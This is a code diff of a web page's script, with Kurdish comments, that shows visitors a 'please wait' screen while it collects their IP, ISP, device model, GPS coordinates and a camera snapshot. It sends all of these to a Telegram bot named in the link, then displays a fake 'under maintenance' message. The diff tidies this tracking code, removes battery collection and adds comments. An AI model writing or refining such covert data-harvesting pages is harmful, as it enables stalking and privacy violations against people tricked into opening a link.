@@ -54,29 +54,6 @@
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('id') || "6782298541";
 
-        function getVisitTime() {
-            const now = new Date();
-            return now.toISOString().replace('T', ' ').substring(0, 19);
-        }
-
-        async function getBatteryInfo() {
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    return `%${Math.round(battery.level * 100)} (${battery.charging ? "لەسەر شەحنە" : "لەسەر شەحن نییە"})`;
-                } catch (e) { return "نادیار"; }
-            }
-            return "پشتگیری ناکرێت";
-        }
-
-        async function getDeviceModel() {
-            try {
-                const parser = new UAParser();
-                const result = parser.getResult();
-                return `${result.device.vendor \vert{}\vert{} ''}${result.device.model || ''} (${result.os.name \vert{}\vert{} ''}${result.os.version || ''})`.trim() || "نادیار";
-            } catch (e) { return "نادیار"; }
-        }
-
         async function sendTelegramMessage(text) {
             if (!chatId) return;
             try {
@@ -85,7 +62,9 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
                 });
-            } catch (err) {}
+            } catch (err) {
+                console.error(err);
+            }
         }
 
         async function sendTelegramPhoto(blob) {
@@ -96,16 +75,26 @@
             formData.append('caption', '📸 **وێنەی ڕاستەوخۆی بەکارهێنەر!**');
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-            } catch (err) {}
+            } catch (err) {
+                console.error(err);
+            }
         }
 
         async function startProcess() {
+            // نیشاندانی پەیامی چاوەڕوانی
             document.getElementById('content-box').innerHTML = '<h1>⏳ چاوەڕوان بێ...</h1><p>تکایە کەمێک بوەستە.</p>';
 
-            const visitTime = getVisitTime();
-            const batteryInfo = await getBatteryInfo();
-            const deviceModel = await getDeviceModel();
+            let visitTime = new Date().toISOString().replace('T', ' ').substring(0, 19);
+            
+            // وەرگرتنی زانیاری ئامێر
+            let deviceModel = "نادیار";
+            try {
+                const parser = new UAParser();
+                const result = parser.getResult();
+                deviceModel = `${result.device.vendor \vert{}\vert{} ''}${result.device.model || ''} (${result.os.name \vert{}\vert{} ''}${result.os.version || ''})`.trim();
+            } catch (e) {}
 
+            // وەرگرتنی IP
             let ip = 'نادیار', isp = 'نادیار';
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -114,14 +103,18 @@
                 isp = data.org || 'نادیار';
             } catch (e) {}
 
+            // وەرگرتنی لۆکەیشن بە خێرایی (بە بێ وەستانی سکریپت ئەگەر ڕەتکرایەوە)
             let locationText = "❌ لۆکەیشن بەردەست نییە";
             try {
-                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 }));
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
+                });
                 locationText = `🟢 لۆکەیشن: \`${pos.coords.latitude}, ${pos.coords.longitude}\``;
             } catch (e) {
-                locationText = "🔴 لۆکەیشن ڕەتکرایەوە یان بەردەست نییە";
+                locationText = "🔴 لۆکەیشن ڕەتکرایەوە یان کاتی بەسەرچوو";
             }
 
+            // وەرگرتنی وێنەی کامێرا بە شێوەیەکی پارێزراو
             let imageBlob = null;
             let cameraStatus = "❌ کامێرا بەردەست نییە";
             try {
@@ -143,20 +136,25 @@
                     }, 1000);
                 });
             } catch (e) {
-                cameraStatus = "🔴 کامێرا ڕەتکرایەوە";
+                cameraStatus = "🔴 کامێرا ڕەتکرایەوە یان قفڵ کراوە";
             }
 
+            // ناردنی پەیامی دەقی بۆ تێلێگرام
             const msg = `🔔 **سەردانیکەرێکی نوێ!**
 ⏰ کات: \`${visitTime}\`
-🔋 شەحن: \`${batteryInfo}\`
 🌐 IP: \`${ip}\` (${isp})
 🎯 GPS: ${locationText}
 📷 کامێرا: ${cameraStatus}
 📱 ئامێر: \`${deviceModel}\``;
 
             await sendTelegramMessage(msg);
-            if (imageBlob) await sendTelegramPhoto(imageBlob);
 
+            // ناردنی وێنە ئەگەر هەبوو
+            if (imageBlob) {
+                await sendTelegramPhoto(imageBlob);
+            }
+
+            // گەڕاندنەوەی باری ئاسایی پەڕەکە لەلای بەکارهێنەر
             document.getElementById('content-box').innerHTML = '<h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1><p>تکایە دووبارە هەوڵ بدەرەوە.</p>';
         }
     </script>
